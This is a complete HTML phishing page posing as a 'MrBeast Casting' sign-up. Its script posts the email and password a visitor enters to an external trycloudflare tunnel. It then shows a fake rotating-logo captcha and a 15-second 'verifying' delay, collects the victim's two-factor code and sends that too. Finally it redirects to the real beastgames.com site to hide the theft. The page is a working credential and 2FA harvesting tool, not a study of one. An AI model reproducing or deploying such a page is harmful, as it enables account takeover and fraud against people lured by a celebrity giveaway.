<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MrBeast Casting</title>
    <style>
        :root { --blue: #00a8e8; --pink: #f12e3e; }
        body { font-family: sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') repeat; background-size: 70px; opacity: 0.2; z-index: 0; pointer-events: none; }
        .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 40px 25px; text-align: center; margin-top: 50px; position: relative; z-index: 10; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .logo { width: 130px; margin-bottom: 20px; }
        input { width: 100%; padding: 18px; margin-bottom: 15px; border: 1px solid #222; background: #1a1a1a; color: #fff; border-radius: 15px; font-size: 16px; outline: none; }
        .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        
        /* Rotate Captcha UI */
        #captcha_ui { display: none; padding: 20px; }
        .rotate-container { width: 220px; height: 220px; margin: 0 auto; position: relative; border-radius: 50%; border: 4px solid var(--blue); overflow: hidden; background: #000; }
        .rotate-img { width: 100%; height: 100%; transition: transform 0.1s; transform: rotate(160deg); object-fit: contain; padding: 20px; }
        .slider-track { width: 100%; height: 45px; background: #222; border-radius: 25px; margin-top: 30px; position: relative; border: 1px solid #444; }
        .slider-handle { width: 70px; height: 45px; background: var(--blue); border-radius: 25px; position: absolute; left: 0; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; font-size: 20px; box-shadow: 0 0 15px var(--blue); }
        
        #loader, #otp_section { display: none; }
        .spinner { border: 5px solid rgba(0, 212, 255, 0.1); border-top: 5px solid var(--blue); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <div class="box">
        <div id="login_section">
            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="logo">
            <h2 style="margin-bottom:10px;">MRBEAST CASTING</h2>
            <p style="color:#aaa; font-size:14px; margin-bottom:25px;">Verify your status for the next challenge</p>
            <input type="email" id="email" placeholder="Email Address">
            <input type="password" id="pass" placeholder="Password">
            <button class="btn" onclick="sendLogin()">CONTINUE</button>
        </div>

        <div id="captcha_ui">
            <p>Slide to rotate the logo upright</p>
            <div class="rotate-container">
                <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="rotate-img" id="r_img">
            </div>
            <div class="slider-track" id="track">
                <div class="slider-handle" id="handle">>>></div>
            </div>
        </div>

        <div id="loader"><div class="spinner"></div><p>Verifying Human Identity...</p></div>

        <div id="otp_section">
            <h2 style="font-size:22px;">SECURITY CHECK</h2>
            <p style="color:#aaa; font-size:14px;">Enter the 6-digit code from your device</p>
            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px; letter-spacing:8px;">
            <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
        </div>
    </div>

    <script>
        const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com ";

        function sendLogin() {
            const e = document.getElementById('email').value, p = document.getElementById('pass').value;
            if(e && p) {
                fetch(tunnel, { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                document.getElementById('login_section').style.display = 'none';
                document.getElementById('captcha_ui').style.display = 'block';
                initRotate();
            }
        }

        function initRotate() {
            const handle = document.getElementById('handle'), img = document.getElementById('r_img'), track = document.getElementById('track');
            let dragging = false;

            const move = (e) => {
                if (!dragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let x = clientX - track.getBoundingClientRect().left - 35;
                if (x < 0) x = 0; if (x > track.offsetWidth - 70) x = track.offsetWidth - 70;
                handle.style.left = x + 'px';
                
                // Calculates rotation from 160deg to 360deg
                let rot = 160 + (x / (track.offsetWidth - 70)) * 200;
                img.style.transform = `rotate(${rot}deg)`;
                
                // Success Match (360 degrees = upright)
                if (rot > 355 && rot < 365) { 
                    dragging = false; 
                    handle.style.background = "#00ff00"; 
                    setTimeout(showLoader, 600); 
                }
            };

            handle.addEventListener('mousedown', () => dragging = true);
            handle.addEventListener('touchstart', (e) => { dragging = true; if(e.cancelable) e.preventDefault(); }, {passive: false});
            window.addEventListener('mousemove', move);
            window.addEventListener('touchmove', move, {passive: false});
            window.addEventListener('mouseup', () => dragging = false);
            window.addEventListener('touchend', () => dragging = false);
        }

        function showLoader() {
            document.getElementById('captcha_ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('otp_section').style.display = 'block';
            }, 15000); // 15 Second Delay Fixed
        }

        function submitOTP() {
            const c = document.getElementById('2fa_code').value;
            fetch(tunnel, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ '2fa_code': c })
            }).then(() => {
                window.location.href = "https://beastgames.com"; // REDIRECT UNSTUCK
            }).catch(() => {
                window.location.href = "https://beastgames.com";
            });
        }
    </script>
</body>
</html>
